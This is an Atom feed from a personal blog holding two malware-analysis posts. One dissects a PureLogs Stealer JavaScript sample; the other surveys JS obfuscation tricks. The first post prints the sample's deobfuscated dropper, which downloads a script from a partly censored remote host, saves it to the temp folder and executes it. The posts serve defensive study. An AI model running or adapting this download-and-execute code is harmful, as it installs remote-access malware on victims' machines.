<?xml version="1.0" encoding="utf-8"?>

<feed xmlns="http://www.w3.org/2005/Atom" >
  <generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator>
  <link href="http://localhost:4000/tag/js/feed.xml" rel="self" type="application/atom+xml" />
  <link href="http://localhost:4000/" rel="alternate" type="text/html" />
  <updated>2024-05-05T12:58:46-06:00</updated>
  <id>http://localhost:4000/tag/js/feed.xml</id>

  
  
  

  
    <title type="html">Hanleyjames.github.io | </title>
  

  
    <subtitle>A blog about software engineering and books</subtitle>
  

  

  
    
      
    
  

  
  

  
    <entry>
      <title type="html">PureLogs Stealer</title>
      <link href="http://localhost:4000/PureLogStealer" rel="alternate" type="text/html" title="PureLogs Stealer" />
      <published>2024-05-05T05:50:00-06:00</published>
      <updated>2024-05-05T05:50:00-06:00</updated>
      <id>http://localhost:4000/PureLogStealer</id>
      <content type="html" xml:base="http://localhost:4000/PureLogStealer">&lt;p&gt;MalwareBazzar: 3eaae1b3f71898ceac37bd6a7779ed9e821d06a1004ff5f527922ae6c9066082&lt;/p&gt;

&lt;h1 id=&quot;about&quot;&gt;About&lt;/h1&gt;

&lt;p&gt;I don’t know much about the Purelogs family, but there is a blog from Any.Run by &lt;a href=&quot;https://any.run/cybersecurity-blog/pure-malware-family-analysis/&quot;&gt;khr0x, Jane &amp;amp; Maksim Mikhailov&lt;/a&gt; in more detail and better than I could probably do at this moment due to time. It’s worth reading so I would recommend checking it out. The file itself looks like the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/24-05-05-PureLogStealer-1.JPG&quot; alt=&quot;PureLogsStealer1&quot; title=&quot;PureLogs Stealer1&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-overview&quot;&gt;Initial Overview&lt;/h3&gt;

&lt;p&gt;This relatively short file is pretty straightforward. At first glance, what seems to be happening is we’re building a string with the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode&quot;&gt;stactic method&lt;/a&gt; on the String object.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    String.fromCharCode(...)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To make the code a bit clearer, we essentially have a really large string we’re building, and are hiding the UTF-16 character codes by taking a number, in this case the variable U1s (258393352); we’re then taking a larger number and subtracting it to get our UTF-16 character code.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/24-05-05-PureLogsStealer-2.JPG&quot; alt=&quot;PureLogsStealer2&quot; title=&quot;PureLogs Stealer2&quot; /&gt;
&lt;img src=&quot;/assets/images/24-05-05-PureLogsStealer-3.jpg&quot; alt=&quot;PureLogsStealer3&quot; title=&quot;PureLogs Stealer3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It then follows that each of these builds a string that we’re going to &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval&quot;&gt;eval()&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;payload&quot;&gt;Payload&lt;/h3&gt;

&lt;p&gt;The following string is the actual JS that is used to drop a secondary file and the payload itself. I have cleaned up some variable names and censored the domain name to prevent someone accidentally following the link.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    try{
        var Object = new ActiveXObject(&apos;MSXML2.XMLHTTP&apos;)
        Object.Open(&apos;GET&apos;,
            &apos;https://postutopia.***/wp-includes/images/smilies/wp.js&apos;,
            false
        )
        Object.Send()
        var axo = new ActiveXObject(&apos;Scripting.FileSystemObject&apos;)
        var filepath = axo.GetSpecialFolder(2) + &apos;/IDWYPJ.js&apos;

        if (Object.Status == 200){
            var Stream = new ActiveXObject(&apos;ADODB.Stream&apos;)
            Stream.Open()
            Stream.Type = 1
            Stream.Write(Object.ResponseBody)
            Stream.Position = 0
            Stream.SaveToFile(filepath, 2)
            Stream.Close()
            var WshShell = new ActiveXObject(&apos;WScript.Shell&apos;)
            var oRun = WshShell.Run(filepath)
        }
    } catch(e) {}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file works by checking for the existence of this wp.js file stored. It then sends this get request and creates an ActiveXObject (axo), this is used to get the filepath to the temporary directory and the file we’re creating. If the GET request is successful we write the wp.js file and save it (if it already exists we overwrite it). Last we create one more ActiveXObject to run the dropped wp.js, now named IDWYPJ.js file. This new file then drops an EXE and creates a few files in the temp directory called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audio.exe&lt;/code&gt;, which looks to be an AsyncRAT.&lt;/p&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;This sample of malware was not particularly interesting in terms of JS and what it did to obscure its intent. It’s primary payload was only novel in the sense it that it used String.fromCharCode, but it was not so obscure, that it was hard to figure out immediately what was going on. It then delivered the main JS in this String of CharCodes that it calls eval on. To read more about the malware itself and its full lifecylce, you can &lt;a href=&quot;https://www.joesandbox.com/analysis/1430766/0/html&quot;&gt;follow that here&lt;/a&gt;. This was probably one of the easier samples I had an opportunity to mess around with.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>James Hanley</name>
        
        
      </author>

      

      
        <category term="Malware" />
      
        <category term="JS" />
      

      
        <summary type="html">MalwareBazzar: 3eaae1b3f71898ceac37bd6a7779ed9e821d06a1004ff5f527922ae6c9066082</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">JS Malware Obsfucation</title>
      <link href="http://localhost:4000/js-malware-Obsfucation" rel="alternate" type="text/html" title="JS Malware Obsfucation" />
      <published>2024-05-04T05:00:00-06:00</published>
      <updated>2024-05-04T05:00:00-06:00</updated>
      <id>http://localhost:4000/js-malware-Obsfucation</id>
      <content type="html" xml:base="http://localhost:4000/js-malware-Obsfucation">&lt;p&gt;I have been spending my free time recently learning how Javascript malware works, and what are some common methods for infection. While this might be something others know or have touched upon, for me this is all new. My knowledge of JS Malware in recent memory really only dealt with cryptomining. Some of the things that I am coming to learn is the majority will focus on windows machines. Primarily (I don’t have enough experience to say this with confidence), they use &lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc738350(v=ws.10)&quot;&gt;Windows Script Host/WSH&lt;/a&gt; to do the majority of the work. Either from there they use WSH or &lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions/windows/desktop/automat/activex-objects&quot;&gt;ActiveXObjects&lt;/a&gt; to write files. I am not really sure which ones are examples of those that effect unix based systems that are not either hijacked node packages, or&lt;/p&gt;

&lt;h3 id=&quot;obfuscation&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Obfuscation_(software)&quot;&gt;Obfuscation&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Part of what makes JS Malware interesting to me, is at face value I am not looking at compiled code where I would need to decompile it or look at the side effects of it running to get an idea of what it is doing. I should(in theory), be able to step through and clean the code up, and what I don’t understand I should be able to run in parts to build those things. The primary ways I have seen so far that JS Malware does so is the following:&lt;/p&gt;

&lt;h3 id=&quot;comment-bloat&quot;&gt;Comment bloat&lt;/h3&gt;

&lt;p&gt;I have looked at Wikiloader, SSloader and a few other samples, and they will bloat the code with a lot of comments. These are often just words to fill space, or sometimes contain more code to obfuscate the payload further.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/24-5-4-wikiloader.JPG&quot; alt=&quot;Wikiloader&quot; title=&quot;Wikiloader&quot; /&gt;
&lt;img src=&quot;/assets/images/24-5-4-SSLoad.JPG&quot; alt=&quot;SSload&quot; title=&quot;SSLoad&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;hex-and-unicode&quot;&gt;Hex and Unicode&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Any set of characters in Hex or Unicode are interpolated. This means I can hide certain aspects of code in a way that is not clear or visible at first. An example would be:&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  String[&apos;\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065&apos;].test = function(){
      console.log(&apos;test&apos;);
  }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This creates a prototype function called test, which more cleanly looks like&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    String[&apos;prototype&apos;].test = function(){
        console.log(&apos;test&apos;);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I am open to being corrected if wrong, but JS cannot use String.’prototype’.Function =()=&amp;gt;{…}. Often when ‘prototype’ or ‘constructor’ is used, its used in the way listed above. Otherwise these strings are used to obscure commands used by WSH or ActiveXObjects.&lt;/p&gt;

&lt;h3 id=&quot;eval&quot;&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval&quot;&gt;Eval&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Eval is kind of a fun, nasty and slow way of hiding code. This often uses hex, unicode, base64 decoded strings or charCodes to hide a payload.  Any string that comes in such as the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    eval(&quot;let murr = 1200; console.log(murr);&quot;);
    1200
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This allows someone to use one of the approaches above, to build javascript that will execute further obscured code.&lt;/p&gt;

&lt;h3 id=&quot;function-and-variable-bloating&quot;&gt;Function and Variable bloating&lt;/h3&gt;

&lt;p&gt;This is relatively straight forward. A developer hides the intent behind as much obscure functions, calling them and creating variables that will call each other. This just is more to waste time making it hard to figure out exactly what is being called. An example is this Cryptodrainer js file. While there is some visible intent in this file, most of the prior is overwhelming, and done with intent to make it that way. We’re left with 85k lines of functions that just seems like a marathon of a wall.
&lt;img src=&quot;/assets/images/24-5-4-CryptoDrainer.JPG&quot; alt=&quot;CryptoDrainer&quot; title=&quot;CryptoDrainer&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;closing-thoughts&quot;&gt;Closing thoughts&lt;/h3&gt;

&lt;p&gt;I am sure there are different ways of things being done, but these are the most common that I have run into. I am going to take this as a living breathing document, and hopefully will return to update these as I build more information around it. I will be producing articles that are more about processing individual JS Malware files, and going through things that I think are unique or interesting. Hopefully, someone here finds them as interesting as I do.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>James Hanley</name>
        
        
      </author>

      

      
        <category term="Malware" />
      
        <category term="JS" />
      

      
        <summary type="html">I have been spending my free time recently learning how Javascript malware works, and what are some common methods for infection. While this might be something others know or have touched upon, for me this is all new. My knowledge of JS Malware in recent memory really only dealt with cryptomining. Some of the things that I am coming to learn is the majority will focus on windows machines. Primarily (I don’t have enough experience to say this with confidence), they use Windows Script Host/WSH to do the majority of the work. Either from there they use WSH or ActiveXObjects to write files. I am not really sure which ones are examples of those that effect unix based systems that are not either hijacked node packages, or</summary>
      

      
      
    </entry>
  
</feed>
